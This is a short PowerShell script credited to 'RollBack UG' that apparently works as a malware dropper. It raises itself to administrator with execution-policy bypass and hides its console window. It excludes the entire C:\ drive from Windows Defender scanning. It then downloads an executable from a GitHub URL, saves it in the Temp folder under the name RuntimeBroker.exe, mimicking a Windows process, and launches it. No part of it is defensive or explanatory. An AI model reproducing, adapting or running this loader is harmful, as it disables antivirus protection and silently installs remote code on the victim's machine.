#############################################################################################################################
# By RollBack UG
# (Administrator rights are privileges granted to users that allow them to perform most functions on a computer's operating system.)

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

#############################################################################################################################



Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$console = [Console.Window]::GetConsoleWindow()
# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null

#############################################################################################################################



Add-MpPreference -ExclusionPath C:\

#############################################################################################################################



$url = "https://github.com/LuisPhantom/Vemom/raw/main/Setup_Vemom.exe"

#############################################################################################################################



$output = "$env:Temp/RuntimeBroker.exe"

#############################################################################################################################



Invoke-WebRequest -Uri $url -OutFile $output

#############################################################################################################################



Start-Process -FilePath $output

#############################################################################################################################
